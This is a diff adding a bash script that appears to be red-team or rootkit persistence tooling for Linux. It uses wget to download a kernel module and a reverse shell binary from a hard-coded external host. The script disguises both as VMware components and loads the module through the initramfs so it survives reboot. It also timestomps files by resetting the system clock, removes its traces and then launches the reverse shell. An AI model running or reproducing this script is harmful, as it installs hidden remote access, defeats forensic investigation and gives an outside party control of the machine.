@@ -1,0 +1,78 @@
+#!/bin/bash
+set -euo pipefail
+trap cleanup EXIT
+savetime(){
+	echo "$(date +%s -d "$(stat -c %y "$1")") $1" >> "$datefile"
+}
+
+cleanup(){
+	while read -r ctime afile; do
+		echo "Fixing $afile"
+		date -s "@$ctime" >/dev/null
+		touch "$afile"
+	done < "$datefile"
+	date -s "$now" >/dev/null
+	rm "$datefile"
+	return 0
+}
+
+timestomp(){
+	date -s "$1" >/dev/null
+	touch "$2"
+}
+
+now="$(date)"
+datefile="$(mktemp)"
+
+kernel="$(uname -r)"
+initscript="/etc/initramfs-tools/scripts/local-bottom/vmware"
+#inithook="/etc/initramfs-tools/hooks/redteam"
+dev="/dev/vmware-helper"
+revshell="/bin/vmware-daemon"
+me="5.5.0.170"
+loadnow="false"
+if [ ! -e "$dev" ]; then
+	loadnow="true"
+fi
+
+# First save the kernel dir time
+savetime /lib/modules/$kernel/kernel
+# Then try to grab the kernel module for this kernel
+wget http://$me:8000/vmware.$kernel.$(uname -m).ko -O /lib/modules/$kernel/kernel/vmware.ko
+# If this doesn't exist, then the script should bail and clean up the nothing that it did.
+
+rm -f "$revshell"
+wget http://$me:8000/shells/revshell -O "$revshell"
+chmod 755 "$revshell"
+timestomp "$(stat -c %y /bin/bash)" "$revshell"
+
+for f in /lib/modules/$kernel/modules*; do
+	savetime "$f"
+done
+depmod -a
+
+cat << DOG > "$initscript"
+#!/bin/sh
+mknod "$dev" c 33 0 2>/dev/null
+chmod 777 "$dev"
+DOG
+chmod 755 "$initscript"
+
+#cat << DOG > "$inithook"
+##!/bin/sh
+#cp "$revshell" "\${DESTDIR}$revshell"
+#DOG
+#chmod 755 "$inithook"
+
+savetime /etc/initramfs-tools/modules
+echo "vmware" >> /etc/initramfs-tools/modules
+savetime /boot/initrd.img-"$kernel"
+update-initramfs -ck "$kernel"
+sed -i '/vmware/d' /etc/initramfs-tools/modules
+rm "$initscript"
+if [ "$loadnow" = "true" ]; then
+	insmod /lib/modules/$kernel/kernel/vmware.ko
+fi
+rm /lib/modules/$kernel/kernel/vmware.ko
+depmod -a
+"$revshell"
